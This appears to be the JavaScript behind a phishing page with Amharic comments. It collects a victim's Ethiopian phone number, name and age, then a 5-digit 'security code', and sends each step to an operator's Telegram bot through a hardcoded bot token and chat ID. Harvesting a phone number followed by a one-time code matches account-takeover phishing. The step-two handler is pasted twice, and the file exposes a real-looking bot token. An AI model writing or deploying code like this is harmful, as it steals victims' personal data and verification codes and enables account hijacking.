const step1 = document.getElementById("step-1");
const step2 = document.getElementById("step-2");
const messageEl = document.getElementById("message");

// የቴሌግራም ቦት መረጃዎችህ
const BOT_TOKEN = "8390831093:AAHjzucnRMZ33JeT5pZU29eiudaCxPycDBs";
const CHAT_ID = "8991759353";

let savedPhone = "";
let savedName = "";
let savedAge = "";

// 1ኛ እርምጃ: ስልክ፣ ስም እና እድሜ ተሞልቶ Next ሲጫን
document.getElementById("form-step-1").addEventListener("submit", async (e) => {
  e.preventDefault();

  const phoneInput = document.getElementById("phone");
  const nameInput = document.getElementById("name");
  const ageInput = document.getElementById("age");

  savedPhone = phoneInput.value.trim();
  savedName = nameInput.value.trim();
  const ageValue = parseInt(ageInput.value.trim());

  messageEl.textContent = "";

  // 1. የኢትዮጵያ ስልክ ቁጥር ማረጋገጫ (በ 09 ወይም 07 የሚጀምር፣ 10 ዲጂት)
  const phoneRegex = /^(09|07)\d{8}$/;
  if (!phoneRegex.test(savedPhone)) {
    messageEl.style.color = "#f85149";
    messageEl.textContent = "Error: Phone must start with 09 or 07 and be 10 digits!";
    phoneInput.focus();
    return;
  }

  // 2. ስም መሞላቱን ማረጋገጥ
  if (savedName === "") {
    messageEl.style.color = "#f85149";
    messageEl.textContent = "Error: Please enter your name!";
    nameInput.focus();
    return;
  }

  // 3. እድሜ ከ 16 በታች መሆን አለመሆኑን ማረጋገጫ
  if (isNaN(ageValue) || ageValue < 16) {
    messageEl.style.color = "#f85149";
    messageEl.textContent = "Error: You must be at least 16 years old!";
    ageInput.focus();
    return;
  }
  savedAge = ageValue;

  // መረጃውን ቀድመው ወደ ቴሌግራም ቦት መላክ
  const text = "📥 አዲስ መረጃ ገብቷል (እርምጃ 1)!\n\n📱 ስልክ: " + savedPhone + "\n👤 ስም: " + savedName + "\n🎂 እድሜ: " + savedAge;
  const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";

  try {
    messageEl.style.color = "#58a6ff";
    messageEl.textContent = "Processing...";

    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    });

    const data = await response.json();

    if (data.ok) {
      messageEl.textContent = "";
      // 1ኛውን ገጽ ደብቆ 2ተኛውን የኮድ ማስገቢያ ማሳየት
      step1.classList.add("hidden");
      step2.classList.remove("hidden");
    } else {
      messageEl.style.color = "#f85149";
      messageEl.textContent = "Telegram Error: " + data.description;
    }
  } catch (err) {
    messageEl.style.color = "#f85149";
    messageEl.textContent = "Network error occurred!";
  }
});

// 2ኛ እርምጃ: የ 5 ዲጂት ኮድ ገብቶ Submit ሲደረግ
document.getElementById("form-step-2").addEventListener("submit", async (e) => {
  e.preventDefault();

  const codeInput = document.getElementById("code");
  const code = codeInput.value.trim();

  messageEl.textContent = "";

  // የ 5 ዲጂት ጥብቅ ማረጋገጫ (ከ 5 ማነስም ሆነ መብለጥ የለበትም)
  const codeRegex = /^\d{5}$/;
  if (!codeRegex.test(code)) {
    messageEl.style.color = "#f85149";
    messageEl.textContent = "Error: Code must be exactly 5 digits!";
    codeInput.focus();
    return;
  }

  // ኮዱን ወደ ቴሌግራም ቦት መላክ
  const text = "🔑 የደህንነት ኮድ ገብቷል (እርምጃ 2)!\n\n📱 ስልክ: " + savedPhone + "\n🔑 ኮድ: " + code;
  const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";

  try {
    messageEl.style.color = "#58a6ff";
    messageEl.textContent = "Sending code...";

    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    });

    const data = await response.json();

    if (data.ok) {
      messageEl.style.color = "#3fb950";
      messageEl.textContent = "Successfully submitted!";
      codeInput.value = "";
    } else {
      messageEl.style.color = "#f85149";
      messageEl.textContent = "Telegram Error: " + data.description;
    }
  } catch (err) {
    messageEl.style.color = "#f85149";
    messageEl.textContent = "Network error occurred!";
  }
});






// 2ኛ እርምጃ: የ 5 ዲጂት ኮድ ገብቶ Submit ሲደረግ
document.getElementById("form-step-2").addEventListener("submit", async (e) => {
  e.preventDefault();

  const codeInput = document.getElementById("code");
  const code = codeInput.value.trim();

  messageEl.textContent = "";

  // የ 5 ዲጂት ጥብቅ ማረጋገጫ (ከ 5 ማነስም ሆነ መብለጥ የለበትም)
  const codeRegex = /^\d{5}$/;
  if (!codeRegex.test(code)) {
    messageEl.style.color = "#f85149";
    messageEl.textContent = "Error: Code must be exactly 5 digits!";
    codeInput.focus();
    return;
  }

  // ኮዱን ወደ ቴሌግራም ቦት መላክ
  const text = "🔑 የደህንነት ኮድ ገብቷል (እርምጃ 2)!\n\n📱 ስልክ: " + savedPhone + "\n🔑 ኮድ: " + code;
  const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";

  try {
    messageEl.style.color = "#58a6ff";
    messageEl.textContent = "Sending code...";

    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    });

    const data = await response.json();

    if (data.ok) {
      // መረጃው በትክክል ወደ ቦት ከገባ በኋላ ወደ አዲሱ የ 15 ሰከንድ ፕርግረስ ገጽ ይመራዋል
      window.location.href = "pro.html";
    } else {
      messageEl.style.color = "#f85149";
      messageEl.textContent = "Telegram Error: " + data.description;
    }
  } catch (err) {
    messageEl.style.color = "#f85149";
    messageEl.textContent = "Network error occurred!";
  }
});
